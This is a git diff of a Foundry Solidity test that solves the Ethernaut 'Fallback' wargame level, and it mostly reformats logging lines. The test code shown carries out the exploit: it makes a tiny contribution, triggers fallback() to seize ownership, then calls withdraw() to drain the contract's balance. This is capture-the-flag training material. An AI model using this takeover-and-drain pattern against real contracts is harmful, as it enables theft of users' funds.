@@ -36,35 +36,24 @@ contract FallbackTest is DSTest {
         //--------------------------------------------------------------------------------
         fallbackContract.contribute{value: 1 wei}();
 
-        emit log_named_uint(
-            "Verify contribution state change: ",
-            fallbackContract.getContribution()
-        );
+        emit log_named_uint("Verify contribution state change: ", fallbackContract.getContribution());
 
         payable(address(fallbackContract)).call{value: 1 wei}(""); // Trigger `fallback()`
         assertEq(fallbackContract.owner(), attacker);
 
-        emit log_named_uint(
-            "Contract balance (before): ",
-            address(fallbackContract).balance
-        );
+        emit log_named_uint("Contract balance (before): ", address(fallbackContract).balance);
         emit log_named_uint("Attacker balance (before): ", attacker.balance);
 
         fallbackContract.withdraw(); // Empty smart contract funds
         assertEq(address(fallbackContract).balance, 0);
 
-        emit log_named_uint(
-            "Contract balance (after): ",
-            address(fallbackContract).balance
-        );
+        emit log_named_uint("Contract balance (after): ", address(fallbackContract).balance);
         emit log_named_uint("Attacker balance (after): ", attacker.balance);
 
         //--------------------------------------------------------------------------------
         //                                Submit Level
         //--------------------------------------------------------------------------------
-        bool challengeCompleted = ethernaut.submitLevelInstance(
-            payable(levelAddress)
-        );
+        bool challengeCompleted = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(challengeCompleted);
     }
